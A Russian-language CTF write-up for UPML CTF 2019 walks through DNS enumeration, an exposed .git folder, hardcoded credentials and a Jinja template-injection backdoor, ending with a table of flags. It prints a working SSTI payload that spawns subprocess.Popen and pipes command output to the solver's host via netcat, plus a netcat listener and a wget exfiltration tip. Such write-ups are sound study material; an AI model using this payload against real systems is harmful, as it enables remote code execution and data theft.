# UPML CTF 2019 (23 февраля)

Этот репозиторий содержит райтапы, подготовленные нашей командой.

## Part One
**Здесь разобраны:** Послание сисадмина, DNS-сервера, Исходные коды, Сервер исходных
кодов, Проникновение, Hidden backdoor [Дорешивание]

Для получения DNS-записей домена устанавливаем и используем `fierce`:
```
$ pip install fierce
$ fierce --domain bankbank.exposed
```
В итоге на выходе получаем следующее:
```
NS: ns1.bankbank.exposed. ns2.bankbank.exposed.
SOA: ns1.bankbank.exposed. (95.179.139.209)
Zone: success
{<DNS name @>: '@ 2560 IN SOA ns1 hostmaster 1550888583 600 300 1048576 2560\n'
'@ 1200 IN NS ns1\n'
'@ 1200 IN NS ns2\n'
'@ 300 IN A 95.179.139.209\n'
'@ 300 IN MX 10 mx.yandex.net.\n'
'@ 300 IN TXT "yandex-verification: 70ddd42d9c7067ef"\n'
'@ 300 IN TXT "v=spf1 redirect=_spf.yandex.net~all"\n'
'@ 300 IN TXT "uctf_digg3r_3xp3rt_or_n0t"',
<DNS name mail._domainkey>: 'mail._domainkey 300 IN TXT
"v=DKIM1; k=rsa; t=s; '
'p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDUwGoNveBrd82bnyKs9Nk8z1p7sqiMVfRNhZCQWAq79a0VIibyBft4Pz7SAqFmsNvs" '
'"7TNgZ6kCfYp88ZPFbkntUP8YS9rvuPSMPZTZhQk97vZUfnKklRFZqIFk6UfgzxzwuEx1A9PNUXwUdNXkzpDVKY422B5Ioxqun0jGzLR9MwIDAQAB"',
<DNS name botapi>: 'botapi 300 IN A 95.179.139.209',
<DNS name earn>: 'earn 300 IN A 95.179.139.209',
<DNS name jobs>: 'jobs 300 IN A 95.179.139.209',
<DNS name litsec>: 'litsec 300 IN A 95.179.139.209',
<DNS name ns1>: 'ns1 300 IN A 95.179.139.209',
<DNS name ns2>: 'ns2 300 IN A 95.179.139.209',
<DNS name qr>: 'qr 300 IN A 95.179.139.209',
<DNS name random>: 'random 300 IN A 95.179.139.209',
<DNS name store>: 'store 300 IN A 95.179.139.209',
<DNS name totallysecret-64354262612>: 'totallysecret-64354262612 300 IN TXT ''"uctf_r341_digg3r_3xp3rt"',
<DNS name www>: 'www 300 IN A 95.179.139.209'}
```
Так мы получаем сразу два флажка - для тасков "Послание сисадмина" и "DNS-сервера". 

Помимо найденных флагов обнаруживаем поддомен `botapi.bankbank.exposed`, который, как несложно догадаться, связан с ботом Telegram. А именно – здесь открыта папка `.git` (в чем несложно убедиться, получив 403 вместо типичного 404). В папке репозитория выходим на файл `config` и, таким образом, выходим на след [репозитория](https://gitlab.com/bank-it-dept/botapidemo) на GitLab. Здесь получаем еще два флага (для тасков "Исходные коды" и "Сервер исходных кодов") – один находится в файле `secret.txt` в ветке `testing` репозитория (зашифрованный шифром Цезаря), второй – в описании группы https://gitlab.com/bank-it-dept. 

Наконец, чуть позже в этой же группе создают репозиторий CRM (с исходниками `crm.bankbank.tech`), в которых можно найти найти много чего интересно (например, токен от Telegram-бота и заявленный авторами бэкдор). Во-первых, в шаблоне `templates/crm.html` находим еще один флаг. Во-вторых, в обработчике для URI `/crm/` видим бэкдор, уязвимый перед Template Injection, благодаря чему мы может добиться исполнение произвольного кода (правда, для этого нужно залогиниться в CRM, что, впрочем, несложно - в исходниках находим захардкоженную пару логин-пароль и токен бота, через который можно пересылать себе коды двухфакторной авторизации), результат выполнения которого можно получить самыми разными способами. Например, в случае наличия выделенного сервера запускаем `netcat` в режиме прослушивания:
```
$ nc -lvp 1337
```
Теперь обращаемся по URL
`https://crm.bankbank.tech/crm/?fdata={{''.__class__.__mro__[1].__subclasses__()[259]('<your_command> | nc <your_ip> 1337', shell=True)}}`. 
Индекс 259 подобран так, чтобы классом, от которого вызывается конструктор, был `subprocess.Popen` (этот индекс по каким-то причинам может меняться время от времени, однако подобрать его самостоятельно не составит большого труда). Таким образом, можно прочитать файл `flag.txt` (о котором можно догадаться, узнать из `.gitignore` или с помощью `ls`) и получить заветный флажок. Если же выделенного сервера нет, то получить содержимое файла можно, например, с помощью первого попавшегося онлайн-сниффера, используя при этом `wget` (содержимое можно передавать как GET-параметр запроса). 

Краткая сводка:

| Ветка | Название таска | Категория | Флаг |
| --- | --- | --- | ---- |
| 0 | Послание сисадмина (admin) | Network 100 | `uctf_digg3r_3xp3rt_or_n0t` |
| 0 | Hidden backdoor (backdoor) | Web 250 | `uctf_we_should_go_deeper` |
| 0 | CEO (ceo) | Recon 150 | `uctf_i_kn0w_the_staff` |
| 0 | Исходные коды (code) | Web 100 | `uctf_very_common_git_task` |
| 0 | Сервер исходных кодов (codeserver) | Misc 100 | `uctf_remote_origin_located` |
| 0 | Обман системы (corpflag) | Telegram 400 | `Not now` |
| 0 | DNS сервера (dns) | Network 200 | `uctf_r341_digg3r_3xp3rt` |
| 0 | Ограбление 1.0 (grab1) | Telegram 100 | `uctf_o_v1_hacker` |
| 0 | Ограбление 2.0 (grab2) | Telegram 200 | `Not now` |
| 0 | Глубина (inbox) | Recon 200 | `uctf_instanda` |
| 0 | Staff only (insider) | Recon 500 | `uctfitwasfakecryptotask0` |
| 0 | Hidden | Hidden | `Not now` |
| 0 | Проникновение (naive) | Joy 300 | `uctf_hack3d_supp0rt` |
| 0 | Hidden | Hidden | `Not now` |
| 0 | Скайп (skype) | Recon 50 | `Not now` |
| 0 | Hidden | Hidden | `Not now` |
| 0 | Welcome aboard (start) | Misc 10 | `uctfgoahead` |
| 0 | Hidden | Hidden | `Not now` |
| 0 | Правила (tos) | Misc 150 | `uctfbureaucratslose` |
| 0 | Ожидание (wait) | Web 100 | `uctf_kaef_mode_on` |
| 0 | Hidden | Hidden | `Not now` |

Как обычно, оптимальность решений не гарантируем. :)
